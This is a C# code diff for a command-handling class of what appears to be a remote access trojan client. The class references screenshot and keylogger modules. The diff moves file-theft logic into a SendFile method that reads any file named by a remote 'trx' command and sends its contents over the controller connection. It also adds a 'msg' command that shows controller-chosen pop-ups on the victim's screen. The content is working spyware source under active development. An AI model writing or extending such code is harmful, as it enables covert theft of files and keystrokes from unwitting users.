@@ -12,7 +12,8 @@
 
     using Core.Screenshot;
     using Core.Connection;
-
+    using System.Windows.Forms;
+    using Core.Keylogger;
 
     public class Command
     {
@@ -34,6 +35,34 @@
         {
             _connection = connection ?? throw new Exception("Error, Connection class cannot be null");
             _screenShot = new ScreenCapture();
+        }
+
+        public void SendFile(string fileName)
+        {
+            if (!File.Exists(fileName))
+            {
+                _connection?.SendData("Error sending the file specified");
+                return;
+            }
+
+            // Getting the File Size
+            var fileSize = new FileInfo(fileName).Length;
+
+            var information = string.Format("|archivo|{0}|{1}|", fileSize, fileName.Contains('\\') ?
+                fileName.Split('\\').LastOrDefault() : fileName);
+
+            using (var file = new StreamReader(fileName))
+            {
+                var buffer = file.ReadToEnd();
+
+                _connection?.SendData(information);
+
+                Thread.Sleep(INTERVAL_SEND_FILE);
+
+                _connection?.SendData(buffer);
+            }
+
+            return;
         }
 
         public void ListDirectory(string directoryPattern)
@@ -208,27 +237,7 @@
                 {
                     var fileName = Regex.Split(commandReceived, "trx")[1];
 
-                    if (!File.Exists(fileName))
-                    {
-                        _connection?.SendData("Error sending the file specified");
-                        return;
-                    }
-
-                    // Getting the File Size
-                    var fileSize = new FileInfo(fileName).Length;
-
-                    var information = string.Format("|archivo|{0}|{1}|", fileSize, fileName.Split('\\').LastOrDefault());
-
-                    using (var file = new StreamReader(fileName))
-                    {
-                        var buffer = file.ReadToEnd();
-
-                        _connection?.SendData(information);
-
-                        Thread.Sleep(INTERVAL_SEND_FILE);
-
-                        _connection?.SendData(buffer);
-                    }
+                    SendFile(fileName);
 
                     return;
                 }
@@ -338,6 +347,19 @@
                     ProcessFile(commandReceived);
 
                     return;
+                }
+
+                if (commandReceived.StartsWith("msg"))
+                {
+                    var messageBody = Regex.Split(commandReceived, "msg")[1];
+
+                    var messageSplitted = messageBody.Split(',');
+
+                    var messageTitle = messageSplitted[0];
+                    var messageText = messageSplitted[1].Trim(',');
+                    var messageType = messageSplitted[2].Trim(',');
+
+                    MessageBox.Show(messageText, messageTitle, MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
 
                 ProcessFile(commandReceived, true);
